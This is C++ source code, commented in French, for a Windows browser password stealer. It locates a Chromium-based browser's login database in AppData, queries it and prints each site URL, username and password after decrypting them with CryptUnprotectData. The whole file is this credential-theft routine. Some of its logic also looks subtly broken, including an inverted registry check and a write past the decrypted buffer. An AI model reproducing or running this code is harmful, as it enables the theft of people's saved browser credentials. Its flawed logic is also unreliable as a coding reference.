
#include "BrowserPassword.hh"

bool isBrowserInstalled(const char *regKeyPath) 
{ 
	HKEY hkey = NULL;
	if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyPath, 0, KEY_READ, &hkey))
	{ 
		std::cerr << "[KO]\tBrowser is not installed" << std::endl; 
		return (false);
        }
	RegCloseKey(hkey); // on referme la clé après l'ouverture grâce au handle hkey         
	return (true);
}

bool findAppdataPath(std::string &appdataPath, int folder) 
{ 
	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters, macro présente dans Windows.h 
	if (!SUCCEEDED(SHGetFolderPathA(NULL, folder, NULL, 0, path))) 
	{ 
		std::cerr << "[KO]\tError failed to find Appdata directory" << std::endl; 
		return (false); 
	}         
	appdataPath.append(path); // on ajoute la path dans notre string 
	return (true);
}

void findPasswordTable(sqlite3 *db) 
{ 
	sqlite3_stmt *stmt;
	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, NULL) == SQLITE_OK) 
	{ 
		while (sqlite3_step(stmt) == SQLITE_ROW)  
			printPassword(stmt); /* On déchiffre et on affiche les mots de passes */  
	} 
	else 
		std::cerr << "[KO]\tError compiling query" << std::endl; sqlite3_finalize(stmt); // on indique que l'on a plus besoin de la déclaration 
	sqlite3_close(db); // on ferme la bdd 
}

const char *uncryptData(BYTE *password, int size) 
{ 
	DATA_BLOB in; 
	DATA_BLOB out;

        in.pbData = password;
        in.cbData = size + 1; 
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
	{ 
		out.pbData[out.cbData] = 0; // on set le '\0' 
		return ((const char*)out.pbData);
        } 
	return ("Error not found\n");
}

void printPassword(sqlite3_stmt *stmt) 
{ 
	puts((const char*)sqlite3_column_text(stmt, 0)); // affiche l'url 
	puts((const char*)sqlite3_column_text(stmt, 1)); // affiche le login 
	// déchiffre et affiche le mot de passe 
	puts(uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))); 
}

void databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder) 
{ 
        sqlite3 *db; 
        std::string dbPath; 

        if (isBrowserInstalled(regKeyPath)) // y a t'il bien un navigateur Chrome Engine ?
        {
                if (findAppdataPath(dbPath, folder)) // quel est son dossier appdata ?
                { 
                        dbPath += dbFilePath; // path du dossier appadata + le path du fichier de la bdd
                        if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK) 
                                findPasswordTable(db); /* Trouver les mots de passes et les déchiffrer */
                        else 
                                std::cerr << "[KO]\tError opening database" << std::endl; 
                } 
       } 
}
